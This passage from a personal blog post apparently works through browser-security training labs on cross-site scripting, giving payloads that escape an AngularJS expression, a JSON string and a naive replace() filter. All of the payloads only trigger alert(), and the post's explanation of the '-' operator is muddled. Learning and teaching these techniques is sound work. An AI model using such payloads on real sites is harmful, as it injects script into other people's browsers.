<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;select name=<span class="string">&quot;storeId&quot;</span>&gt;</span><br><span class="line">	<span class="language-xml"><span class="tag">&lt;<span class="name">option</span> <span class="attr">selected</span>=<span class="string">&quot;&quot;</span>&gt;</span>sherlock<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span></span><br><span class="line">&lt;/select&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;1&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">option</span>&gt;</span>London<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">option</span>&gt;</span>Paris<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">option</span>&gt;</span>Milan<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>题目解决</p>
<h3 id="Lab：AngularJS-表达式中的-DOM-XSS，带有尖括号和双引号-HTML-编码"><a href="#Lab：AngularJS-表达式中的-DOM-XSS，带有尖括号和双引号-HTML-编码" class="headerlink" title="Lab：AngularJS 表达式中的 DOM XSS，带有尖括号和双引号 HTML 编码"></a>Lab：AngularJS 表达式中的 DOM XSS，带有尖括号和双引号 HTML 编码</h3><p>该实验在搜索功能中的 AngularJS 表达式中包含基于 DOM 的跨站点脚本漏洞。<br>AngularJS 是一个流行的 JavaScript 库，它扫描包含 <code>ng-app</code> 属性（也称为 AngularJS 指令）的 HTML 节点的内容。当指令添加到 HTML 代码中时，您可以执行双花括号内的 JavaScript 表达式。当对尖括号进行编码时，此技术非常有用。<br>要完成此实验，请执行跨站点脚本攻击，该攻击执行 AngularJS 表达式并调用 <code>alert</code> 函数</p>
<hr>
<p>根据题目提供的相关描述，在谷歌上面进行搜索，得到了一篇相关的非常有用的文章：<a target="_blank" rel="noopener" href="https://nosec.org/home/detail/4153.html">https://nosec.org/home/detail/4153.html</a></p>
<p>由于尖括号被编码了，所以我们不能使用相关特殊字符，便尝试用双花括号</p>
<p>首先输入<code>&#123;&#123;1+1&#125;&#125;</code>：输出为2，表明应用很容易受到客户端模板注入的影响</p>
<p>默认情况下，作用域对象包含另一个名为“构造器”的对象，该对象包含一个也被称为“构造器”的函数。此函数可用于动态生成和执行代码。而这正是我们执行XSS的payload所需要的</p>
<p>所以构造payload为：<code>&#123;&#123;constructor.constructor('alert(1)')()&#125;&#125;</code></p>
<p>题目解决</p>
<h3 id="Lab：反射型-DOM-XSS"><a href="#Lab：反射型-DOM-XSS" class="headerlink" title="Lab：反射型 DOM XSS"></a>Lab：反射型 DOM XSS</h3><p>本实验演示了反射 DOM 漏洞。当服务器端应用程序处理请求中的数据并在响应中回显数据时，就会出现反射 DOM 漏洞。然后，页面上的脚本以不安全的方式处理反射的数据，最终将其写入危险的接收器。要完成本实验，请创建一个调用 <code>alert()</code> 函数的注入</p>
<p>先打开burpsuite，进入实验室后打开proxy，然后在搜索框中随便输入字符串（比如xss），到bp的代理的url历史中找到<code>/search-results?search=xss</code>，把它发送到repeater中，该条目具体内容如下：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../../source/imgs/$%7Bfiilname%7D/image-20240503170613079.png" alt="image-20240503170613079"></p>
<p>我们可以尝试突破双引号包括，即<code>xss&quot;-alert(1)&#125;//</code>，发现行不通，双引号会自动被转义，于是我们可以自己先给它加个转义，而转义符也是可以被转义的，这样子我们就可以突破双引号了，payload为：<code>xss\&quot;-alert(1)&#125;//</code>，如下：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../../source/imgs/$%7Bfiilname%7D/image-20240503171338902.png" alt="image-20240503171338902"></p>
<p>成功逃脱，弹窗成功，题目解决</p>
<p>payload中<code>-</code>的作用：<code>-</code> 后面的内容 <code>alert(1)</code> 是一个 JavaScript 代码片段，它尝试执行一个弹窗警告框。然而，在这种情况下，这段代码被包含在双引号 <code>&quot;</code> 中，并且在外面包裹了反斜杠 <code>\</code>。这样做是为了避免 JSON 格式出错，因为双引号和反斜杠都是 JSON 字符串中的特殊字符，需要进行转义处理。</p>
<p>总之，<code>-</code> 的作用是对搜索条件进行逻辑操作，而这个搜索条件中包含了一个被排除的 JavaScript 代码片段</p>
<h3 id="Lab：存储的-DOM-XSS"><a href="#Lab：存储的-DOM-XSS" class="headerlink" title="Lab：存储的 DOM XSS"></a>Lab：存储的 DOM XSS</h3><p>按照上一题的思路来做，同样的评论部分都为json文件，观察到name位于最后的位置，于是按照上题在name输入框可以这样写：<code>xss\&quot;-alert(1)&#125;]//</code>，回车之后发现并没有奏效</p>
<p>检查响应，发现给<code>\&quot;</code>分别都做了转义处理，于是失败了</p>
<p>查看题解，payload是写在评论的内容中：<code>&lt;&gt;&lt;img src=1 onerror=alert(1)&gt;</code>，回车后点返回到博文，成功弹窗，题目解决</p>
<p>根据题解所说，这样子之所以可以奏效是因为为了防止 XSS，该网站使用 JavaScript <code>replace()</code> 函数对尖括号进行编码。但是，当第一个参数是字符串时，该函数仅替换第一个匹配项。我们利用此漏洞只需在评论的开头添加一组额外的尖括号即可。这些尖括号将被编码，但任何后续的尖括号都不会受到影响，使我们能够有效地绕过过滤器并注入 HTML</p>
</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/Sherlock.jpg" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/Sherlock.jpg" title="头像" alt="头像"></a><div class="post-copyright__author_name">Sherlock</div><div class="post-copyright__author_desc">言念君子，温其如玉</div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="http://example.com/2024/02/10/xss%E5%AD%A6%E4%B9%A0_max/xss%E5%AD%A6%E4%B9%A0/">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('http://example.com/2024/02/10/xss%E5%AD%A6%E4%B9%A0_max/xss%E5%AD%A6%E4%B9%A0/')">xss学习</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="http://example.com/2024/02/10/xss%E5%AD%A6%E4%B9%A0_max/xss%E5%AD%A6%E4%B9%A0/"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=xss学习&amp;url=http://example.com/2024/02/10/xss%E5%AD%A6%E4%B9%A0_max/xss%E5%AD%A6%E4%B9%A0/&amp;pic=" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="rm.copyPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"><a class="post-meta__box__tags" href="/tags/xss/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>xss<span class="tagsPageCount">1</span></a></div></div></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/01/30/ROIS%E5%86%AC%E4%BB%A4%E8%90%A5%E9%A2%98%E8%A7%A3_max/ROIS%E5%86%AC%E4%BB%A4%E8%90%A5%E9%A2%98%E8%A7%A3/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">ROIS冬令营题解</div></div></a></div><div class="next-post pull-right"><a href="/2024/02/16/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0_max/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">php反序列化学习</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info__sayhi" id="author-info__sayhi" onclick="anzhiyu.changeSayHelloText()"></div><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/Sherlock.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-status"><img class="g-status" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/08/24/64e6ce9c507bb.png" ait="status"/></div></div><div class="author-info__description"><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">这里是我<b style="color:#fff">记录学习</b>收获的个人博客，<b style="color:#fff">也希望</b>能和大家一起<b style="color:#fff">进步</b>。</div><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">愿你可以在这里找到对你有<b style="color:#fff">帮助</b>的<b style="color:#fff">文章</b>。</div></div><div class="author-info__bottom-group"><a class="author-info__bottom-group-left" href="/"><h1 class="author-info__name">Sherlock</h1><div class="author-info__desc">言念君子，温其如玉</div></a><div class="card-info-social-icons is-center"><a class="social-icon faa-parent animated-hover" href="https://github.com/cina666" target="_blank" title="Github"><i class="anzhiyufont anzhiyu-icon-github"></i></a></div></div></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bullhorn anzhiyu-shake"></i><span>Announcement</span></div><div class="announcement_content">欢迎来看我的博客鸭~</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80"><span class="toc-number">1.</span> <span class="toc-text">基础</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">1.1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E7%B1%BB"><span class="toc-number">1.2.</span> <span class="toc-text">分类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A1%A5%E5%85%85"><span class="toc-number">1.3.</span> <span class="toc-text">补充</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CRLF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.4.</span> <span class="toc-text">CRLF注入漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF"><span class="toc-number">1.5.</span> <span class="toc-text">绕过姿势</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8B%BC%E6%8E%A5%E7%BB%95%E8%BF%87"><span class="toc-number">1.5.1.</span> <span class="toc-text">拼接绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%87%BD%E6%95%B0%E6%9B%BF%E6%8D%A2"><span class="toc-number">1.5.2.</span> <span class="toc-text">函数替换</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B5%8C%E5%A5%97%E7%BB%95%E8%BF%87"><span class="toc-number">1.5.3.</span> <span class="toc-text">嵌套绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#url%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-number">1.5.4.</span> <span class="toc-text">url编码绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#scr%E5%92%8Chref%E5%B1%9E%E6%80%A7"><span class="toc-number">1.5.5.</span> <span class="toc-text">scr和href属性</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#1-src%E5%B1%9E%E6%80%A7"><span class="toc-number">1.5.5.0.1.</span> <span class="toc-text">1.src属性</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#2-href%E5%B1%9E%E6%80%A7"><span class="toc-number">1.5.5.0.2.</span> <span class="toc-text">2.href属性</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%95%E8%BF%87"><span class="toc-number">1.5.6.</span> <span class="toc-text">()绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8D%95%E5%BC%95%E5%8F%B7%E8%BF%87%E6%BB%A4"><span class="toc-number">1.5.7.</span> <span class="toc-text">单引号过滤</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6"><span class="toc-number">1.5.8.</span> <span class="toc-text">长度限制</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E5%8F%B7%E7%BB%95%E8%BF%87"><span class="toc-number">1.5.9.</span> <span class="toc-text">分号绕过</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xss%E6%8C%91%E6%88%98%E4%B9%8B%E6%97%85"><span class="toc-number">2.</span> <span class="toc-text">xss挑战之旅</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#level-1"><span class="toc-number">2.1.</span> <span class="toc-text">level-1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-2"><span class="toc-number">2.2.</span> <span class="toc-text">level-2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-3"><span class="toc-number">2.3.</span> <span class="toc-text">level-3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-4"><span class="toc-number">2.4.</span> <span class="toc-text">level-4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-5"><span class="toc-number">2.5.</span> <span class="toc-text">level-5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-6"><span class="toc-number">2.6.</span> <span class="toc-text">level-6</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-7"><span class="toc-number">2.7.</span> <span class="toc-text">level-7</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-8%EF%BC%88HTML%E5%AE%9E%E4%BD%93%E7%BB%95%E8%BF%87%EF%BC%89"><span class="toc-number">2.8.</span> <span class="toc-text">level-8（HTML实体绕过）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-9%EF%BC%88http%EF%BC%89"><span class="toc-number">2.9.</span> <span class="toc-text">level-9（http）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-10"><span class="toc-number">2.10.</span> <span class="toc-text">level-10</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-11"><span class="toc-number">2.11.</span> <span class="toc-text">level-11</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-12"><span class="toc-number">2.12.</span> <span class="toc-text">level-12</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-13"><span class="toc-number">2.13.</span> <span class="toc-text">level-13</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-14"><span class="toc-number">2.14.</span> <span class="toc-text">level-14</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-15%EF%BC%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%89"><span class="toc-number">2.15.</span> <span class="toc-text">level-15（文件包含）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-16%EF%BC%88%E6%9B%BF%E6%8D%A2%E7%A9%BA%E6%A0%BC%EF%BC%89"><span class="toc-number">2.16.</span> <span class="toc-text">level-16（替换空格）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CTF-show"><span class="toc-number">3.</span> <span class="toc-text">CTF.show</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web316-web319"><span class="toc-number">3.1.</span> <span class="toc-text">web316-web319</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web320-web326"><span class="toc-number">3.2.</span> <span class="toc-text">web320-web326</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web327"><span class="toc-number">3.3.</span> <span class="toc-text">web327</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CTFHub-XSS"><span class="toc-number">4.</span> <span class="toc-text">CTFHub-XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8B"><span class="toc-number">4.1.</span> <span class="toc-text">反射型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC"><span class="toc-number">4.2.</span> <span class="toc-text">过滤空格</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bp%E5%AE%9E%E9%AA%8C%E5%AE%A4"><span class="toc-number">5.</span> <span class="toc-text">bp实验室</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Lab-DOM-XSS-in-innerHTML-sink-using-source-location-search"><span class="toc-number">5.1.</span> <span class="toc-text">Lab: DOM XSS in innerHTML sink using source location.search</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lab-DOM-XSS-in-jQuery-anchor-href-attribute-sink-using-location-search-source"><span class="toc-number">5.2.</span> <span class="toc-text">Lab: DOM XSS in jQuery anchor href attribute sink using location.search source</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lab-DOM-XSS-in-jQuery-selector-sink-using-a-hashchange-event"><span class="toc-number">5.3.</span> <span class="toc-text">Lab: DOM XSS in jQuery selector sink using a hashchange event</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lab%EF%BC%9A%E5%B0%86-XSS-%E5%8F%8D%E5%B0%84%E5%88%B0%E5%B8%A6%E6%9C%89%E5%B0%96%E6%8B%AC%E5%8F%B7-HTML-%E7%BC%96%E7%A0%81%E7%9A%84%E5%B1%9E%E6%80%A7%E4%B8%AD"><span class="toc-number">5.4.</span> <span class="toc-text">Lab：将 XSS 反射到带有尖括号 HTML 编码的属性中</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lab%EF%BC%9A%E5%B0%86-XSS-%E5%AD%98%E5%82%A8%E5%88%B0%E5%B8%A6%E6%9C%89%E5%8F%8C%E5%BC%95%E5%8F%B7-HTML-%E7%BC%96%E7%A0%81%E7%9A%84%E9%94%9A%E7%82%B9-href-%E5%B1%9E%E6%80%A7%E4%B8%AD"><span class="toc-number">5.5.</span> <span class="toc-text">Lab：将 XSS 存储到带有双引号 HTML 编码的锚点 href 属性中</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lab%EF%BC%9A%E5%B0%86-XSS-%E5%8F%8D%E5%B0%84%E5%88%B0%E5%B8%A6%E6%9C%89%E5%B0%96%E6%8B%AC%E5%8F%B7-HTML-%E7%BC%96%E7%A0%81%E7%9A%84-JavaScript-%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%AD"><span class="toc-number">5.6.</span> <span class="toc-text">Lab：将 XSS 反射到带有尖括号 HTML 编码的 JavaScript 字符串中</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lab%EF%BC%9A-document-write-%E6%8E%A5%E6%94%B6%E5%99%A8%E4%B8%AD%E7%9A%84-DOM-XSS-%E4%BD%BF%E7%94%A8%E9%80%89%E6%8B%A9%E5%85%83%E7%B4%A0%E5%86%85%E7%9A%84%E6%BA%90-location-search"><span class="toc-number">5.7.</span> <span class="toc-text">Lab： document.write 接收器中的 DOM XSS 使用选择元素内的源 location.search</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lab%EF%BC%9AAngularJS-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E4%B8%AD%E7%9A%84-DOM-XSS%EF%BC%8C%E5%B8%A6%E6%9C%89%E5%B0%96%E6%8B%AC%E5%8F%B7%E5%92%8C%E5%8F%8C%E5%BC%95%E5%8F%B7-HTML-%E7%BC%96%E7%A0%81"><span class="toc-number">5.8.</span> <span class="toc-text">Lab：AngularJS 表达式中的 DOM XSS，带有尖括号和双引号 HTML 编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lab%EF%BC%9A%E5%8F%8D%E5%B0%84%E5%9E%8B-DOM-XSS"><span class="toc-number">5.9.</span> <span class="toc-text">Lab：反射型 DOM XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lab%EF%BC%9A%E5%AD%98%E5%82%A8%E7%9A%84-DOM-XSS"><span class="toc-number">5.10.</span> <span class="toc-text">Lab：存储的 DOM XSS</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/08/23/CodeQl-%E5%85%A5%E9%97%A8/" title="CodeQl 入门">CodeQl 入门</a><time datetime="2025-08-23T07:43:42.000Z" title="Created 2025-08-23 15:43:42">2025-08-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/08/20/Tomcat-URL%E8%A7%A3%E6%9E%90%E5%B7%AE%E5%BC%82%E6%80%A7%E5%AF%BC%E8%87%B4%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/" title="Tomcat URL解析差异性导致的安全问题">Tomcat URL解析差异性导致的安全问题</a><time datetime="2025-08-20T12:52:03.000Z" title="Created 2025-08-20 20:52:03">2025-08-20</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/08/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-initial/" title="春秋云镜-initial">春秋云镜-initial</a><time datetime="2025-08-20T08:11:22.000Z" title="Created 2025-08-20 16:11:22">2025-08-20</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/08/15/linux-webshell%E6%8F%90%E6%9D%83/" title="linux webshell提权">linux webshell提权</a><time datetime="2025-08-15T08:12:42.000Z" title="Created 2025-08-15 16:12:42">2025-08-15</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/08/15/%E5%8F%8D%E5%BC%B9shell%E5%8D%87%E7%BA%A7%E4%B8%BA%E5%AE%8C%E5%85%A8%E4%BA%A4%E4%BA%92%E5%BC%8Fshell/" title="反弹shell升级为完全交互式shell">反弹shell升级为完全交互式shell</a><time datetime="2025-08-15T02:58:47.000Z" title="Created 2025-08-15 10:58:47">2025-08-15</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div id="workboard"><img class="workSituationImg boardsign" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@2.0.4/img/badge/安知鱼-上班摸鱼中.svg" alt="距离月入25k也就还差一个大佬带我~" title="距离月入25k也就还差一个大佬带我~"/><div id="runtimeTextTip"></div></div></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"><div class="copyright">&copy;2023 - 2025 By <a class="footer-bar-link" href="/" title="Sherlock" target="_blank">Sherlock</a></div></div><div id="footer-type-tips"></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com/anzhiyu-c/hexo-theme-anzhiyu" title="主题">主题</a></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">Articles</div><div class="length-num">81</div></a><a href="/tags/" title="tag"><div class="headline">Tags</div><div class="length-num">10</div></a><a href="/categories/" title="category"><div class="headline">Categories</div><div class="length-num">10</div></a></div><span class="sidebar-menu-item-title">Function</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="Display Mode"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>Display Mode</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://image.anheyu.com/" title="安知鱼图床"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://image.anheyu.com/favicon.ico" alt="安知鱼图床"/><span class="back-menu-item-text">安知鱼图床</span></a></div></div></div><div class="menus_items"><div class="menus_item"><a class="site-page faa-parent animated-hover" href="/link/"><span> 友人帐</span></a></div><div class="menus_item"><a class="site-page faa-parent animated-hover" href="/essay/"><span> 闲言碎语</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><i class="anzhiyufont anzhiyu-icon-link faa-tada" style="font-size: 0.9em;"></i><span> 友人帐</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/cors/" style="font-size: 0.88rem;">cors<sup>1</sup></a><a href="/tags/csrf/" style="font-size: 0.88rem;">csrf<sup>1</sup></a><a href="/tags/php/" style="font-size: 0.88rem;">php<sup>5</sup></a><a href="/tags/python/" style="font-size: 0.88rem;">python<sup>3</sup></a><a href="/tags/sql/" style="font-size: 0.88rem;">sql<sup>3</sup></a><a href="/tags/ssrf/" style="font-size: 0.88rem;">ssrf<sup>1</sup></a><a href="/tags/ssti/" style="font-size: 0.88rem;">ssti<sup>2</sup></a><a href="/tags/web/" style="font-size: 0.88rem;">web<sup>3</sup></a><a href="/tags/xss/" style="font-size: 0.88rem;">xss<sup>1</sup></a><a href="/tags/%E5%89%8D%E7%AB%AF/" style="font-size: 